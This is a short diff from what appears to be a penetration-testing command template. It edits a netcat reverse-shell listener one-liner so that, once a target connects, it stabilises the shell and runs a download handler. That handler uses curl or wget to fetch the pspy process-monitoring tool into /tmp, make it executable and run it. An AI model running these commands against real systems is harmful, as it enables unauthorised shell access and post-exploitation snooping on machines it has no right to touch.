@@ -18,7 +18,7 @@ $ writeable_path: echo '/tmp/ /var/tmp/ ~/' | tr ' ' '\n'
 $ download_handler: 'curl <full_webpage_with_pspy> -O <writeable_path>/<pspy_version>;chmod +x <writeable_path>/<pspy_version>;<writeable_path>/<pspy_version>
 wget <full_webpage_with_pspy> -O <writeable_path>/<pspy_version>;chmod +x <writeable_path>/<pspy_version>;<writeable_path>/<pspy_version>'
 # pspy listener ! needs client curl or wget on the target
-stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=<term>;echo alias ll='ls -lsaht'; echo clear;<web technology>;cat) | nc -lvnp <port> && reset
+stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=<term>;echo alias ll='ls -lsaht'; echo clear;<download_handler>;cat) | nc -lvnp <port> && reset
 
 
 
